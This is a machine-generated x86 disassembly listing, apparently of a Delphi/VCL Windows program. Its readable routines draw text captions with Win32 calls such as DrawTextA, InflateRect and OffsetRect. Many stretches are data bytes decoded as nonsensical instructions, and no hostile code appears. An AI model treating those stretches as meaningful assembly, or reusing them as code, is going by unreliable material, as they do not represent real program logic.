[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jb r-xdata
inc ebp
outsb
inc esp
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
cmp al 0x10
add [ eax - 0x70 ] ah
jae r-xdata
inc esp
or [ ebx ] eax
or [ ecx ] dl
push esp
inc esp
jb r-xdata
inc ebp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
dec esp
outsb
dec ebp
outsd
jne r-xdata
or al 0x4f
inc esp
jle r-xdata
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
mov esp 0xd800437e
add [ eax ] al
outsd
add [ ebx ] 0x8
push edi
outsd
jb r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942073d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
adc eax 0x1280041
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esi + edi + 0x43 ] ch
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
je r-xdata
xor [ eax ] eax
add [ eax ] al
add al bl
mov [ ebx ] eax
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
jb r-xdata
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add ah ah
aam 0x8
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
outsd
outsb
je r-xdata
cwde
add [ ebx ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
outsb
inc ebp
add al ah
add [ eax ] al
jmp eax
outsd
jne r-xdata
adc eax 0x1780041
add bh bh
js r-xdata
push edi
inc ebx
add [ eax ] cl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xac4c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
or eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
or eax [ ebx ]
scasb [ edi ]
or eax [ ebx ]
or al 0x2
add [ eax ] al
lodsb [ esi ]
mov [ ebx ] es
pushfd
mov eax [ 0x34ac0041 ]
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0xb ] bl
inc ebx
add [ eax ] ah
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0x43 ] ah
add [ eax + eax ] ch
dec ecx
je r-xdata
pop edi
inc eax
add [ ebx + 0x430944c0 ] cl
ja r-xdata
jb r-xdata
je r-xdata
outsd
jb r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
je r-xdata
jb r-xdata
popad
jbe r-xdata
outsd
jbe r-xdata
dec ebp
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ eax ] al
fmul [ ecx + 0x34a00043 ]
inc eax
add [ esp + esi + 0x34b00040 ] ch
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
je r-xdata
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
mov al 0x34
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
popad
add [ eax ] al
or al [ fs : ebx ]
sub al 0x0
outsb
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
add [ esi + edi * 4 - 0x5d0fffbd ] al
inc ecx
add [ eax ] dh
mov edi 0xa2400043
inc ecx
add ah dl
mov [ 0xffffffffa3280041 ] al
inc ecx
add [ eax - 0x43 ] dh
inc ebx
add al dl
cmp eax 0xbde40043
inc ebx
add [ eax - 0x6e ] bh
inc esp
add [ esp + esi * 8 ] ah
inc ebx
add [ edi + edi * 4 + 0x43 ] bl
add [ eax ] bl
mov esi 0x92c80043
inc esp
add ah bl
xchg edx eax
inc esp
add [ eax - 0x42 ] dl
inc ebx
add [ ebx + edx * 4 ] al
inc esp
add [ esi + edi * 4 + 0x3e080043 ] ch
inc ebx
add ah cl
mov esi 0x93140043
inc esp
add [ esp + esi * 8 ] ch
inc ebx
add al al
mov edi 0xc0000043
inc ebx
add ah ch
mov esi 0x93280043
inc esp
add [ ebx + edx * 4 ] ch
inc esp
add [ eax ] dl
mov edi 0xbc800043
inc ebx
add [ ecx ] dl
push esp
inc edx
jne r-xdata
jb r-xdata
outsb
je r-xdata
inc eax
add [ eax - 0x53ffbe5e ] cl
cmp eax 0xa2bc0043
inc ecx
add [ edx + esi ] cl
jb r-xdata
inc eax
or al 0x32
[ eax ] eax
insb
add [ 0x65646e49 ] al
js r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
je r-xdata
dec ebp
popad
outsb
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4309e8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
nop
inc ebx
add [ eax + edx ] bh
outsd
jb r-xdata
add al 0x8
pop es
inc ebx
sub_430bf0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
or eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xd
inc ebx
add [ esi ] bh
or eax 0x2180043
add [ eax ] al
js r-xdata
inc ebx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0xb ] bl
inc ebx
add [ eax ] ah
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
sub_430c4a
inc ebx
add ah bh
test [ ebx ] 0x8
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ eax + 0x40 ] ah
inc ebx
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_4314cd
adc eax 0x2180043
add [ eax ] al
or [ ebx ] dl
inc ebx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0xb ] bl
inc ebx
add [ eax ] ah
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
sub_43150a
inc ebx
add ah bh
test [ ebx ] 0x8
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ ebx + eax * 2 + 0x3d340043 ] bl
inc esp
add [ eax + 0x42 ] dl
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_431c04
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
sbb eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x1d
inc ebx
add [ esi ] dh
sbb eax 0x2140043
add [ eax ] al
js r-xdata
inc ebx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0xb ] bl
inc ebx
add [ eax ] ah
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
sub_431c5e
inc ebx
add ah bh
test [ ebx ] 0x8
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ eax + 0x46 ] ah
inc ebx
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_433125
xor [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add [ ecx + ecx * 2 ] dl
inc ecx
add [ ecx + ecx * 2 + 0x4ca00043 ] ch
inc ecx
add [ eax - 0x7fffbcb7 ] dl
dec edx
inc ebx
add [ eax ] al
dec ebp
inc ecx
add [ ebx + ecx * 2 ] dl
inc ebx
add [ ebx + ecx * 2 + 0x53380043 ] dl
inc ecx
add al al
push ebx
inc ecx
add [ esi + ecx * 2 + 0x43 ] dh
add [ eax ] cl
push ebp
inc ecx
add [ ebx + ecx * 2 + 0x48380043 ] bh
inc ecx
add [ eax + ecx * 2 + 0x41 ] bl
add [ esi + ecx * 2 + 0x43 ] ah
add ah dh
dec esp
inc ebx
add [ ecx * 2 + 0x4cac0043 ] al
inc ecx
add [ eax - 0x4bffbcb2 ] ch
dec esi
inc ecx
add [ eax + 0x5c00414f ] cl
dec esp
inc ebx
add [ edi + ecx * 2 + 0x4fec0041 ] bh
inc ecx
add [ eax + 0x50 ] al
inc ecx
add ah ch
dec esi
inc ebx
add [ edx + edx * 2 + 0x52dc0041 ] al
inc ecx
add [ eax + 0x53 ] dh
inc ecx
add [ edi ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x53786f42
je r-xdata
inc ebx
add [ eax + eax ] dl
add [ eax ] al
sbb al 0x1e
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add ah ah
inc edi
inc ecx
add ah ah
inc ebp
inc ecx
add [ edx + ecx * 2 ] bl
inc ecx
jb r-xdata
imul ebp [ esi + 0x67 ] 0x4331f473
add [ edi ] al
andps xmm1 [ ecx + ebp * 2 + 0x73 ]
je r-xdata
pop [ 0x0 ]
std
jmp [ edi + ecx * 4 + 0x5 ]
push eax
mov edx 0xb9
mov eax esi
call sub_43c6dc
mov edx 0x69
mov eax esi
outsd
js r-xdata
mov eax esi
pop esi
pop ebx
retn
add esp 0xc
call sub_4035d4
pop [ fs : 0x0 ]
call sub_43c700
mov eax esi
test bl bl
je r-xdata
je r-xdata
add [ ebx + 0x53000408 ] ch
push esi
imul ebp [ esi + 0x67 ] 0x43316073
add [ edi + ebx ] al
inc ecx
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f774
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
add [ ebx + 0x56 ] dl
inc ebx
je r-xdata
call sub_41dc4c
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41dba8
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
push ebx
push 0x208838b
add [ eax ] al
insb
jae r-xdata
add [ ebx - 0x7ba9ac40 ] cl
shl [ eax + ecx - 0x7d ] cl
sub_43321c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4453b0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_43c6dc
mov edx 0x69
mov eax esi
call sub_43c700
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_433278
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f774
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41dc4c
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41dba8
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_4332e4
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_433686
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41dc4c
call sub_42f548
call sub_42f628
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41dba8
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_43cf20
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_412b10
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412b10
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_43cf20
mov eax [ ebp - 0x54 ]
call sub_404268
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_43cf20
mov eax [ ebp - 0x58 ]
call sub_404468
push eax
mov eax edi
call sub_41dd2c
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_412b10
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41d5e4
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41d5e4
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d9c4
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41d5e4
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41dd2c
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43368d
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403fcc
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403fcc
lea eax [ ebp - 0x60 ]
call sub_404688
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403fcc
retn
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d9c4
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_43cf20
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_43cf20
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41db8c
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_412b10
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_412b10
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_43cf20
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4047d4
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41dd2c
push eax
call sub_42f548
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42f828
jmp r-xdata
call sub_42f548
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_42f88c
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41dd2c
push eax
call sub_42f548
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42f734
push 0x0
mov eax edi
call sub_41dd2c
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_43cf20
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_43f200
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_43cf20
mov eax [ ebp - 0x80 ]
call sub_404268
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_43cf20
mov eax [ ebp - 0x84 ]
call sub_404468
push eax
mov eax edi
call sub_41dd2c
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41d5e4
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_43cf20
mov eax [ ebp - 0x88 ]
call sub_404268
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_43cf20
mov eax [ ebp - 0x8c ]
call sub_404468
push eax
mov eax edi
call sub_41dd2c
push eax
call DrawTextA
sub_433697
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433712
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cf20
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_453e3c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_442b8c
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
call sub_443c68
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433719
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_433764
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444930
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43c6dc
mov edx 0x11
mov eax esi
call sub_43c700
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_42f548
call sub_42f628
test al al
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_433810
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433966
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43f200
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41dc4c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404270
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404268
push eax
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
mov eax [ ebx + 0x160 ]
call sub_41dd2c
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41ce18
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404268
push eax
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
mov eax [ ebx + 0x160 ]
call sub_41dd2c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41ce18
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404268
push eax
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
mov eax [ ebx + 0x160 ]
call sub_41dd2c
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43396d
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_433977
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_433ba0
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41d700
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41d5e4
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41d700
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41d988
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403454
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403454
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_433a98
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41ddac
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403454
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41ddac
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403454
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_439cac
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_433bdc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_433ba0
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433c3c
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403454
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433c64
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43c3f0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_433cc8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
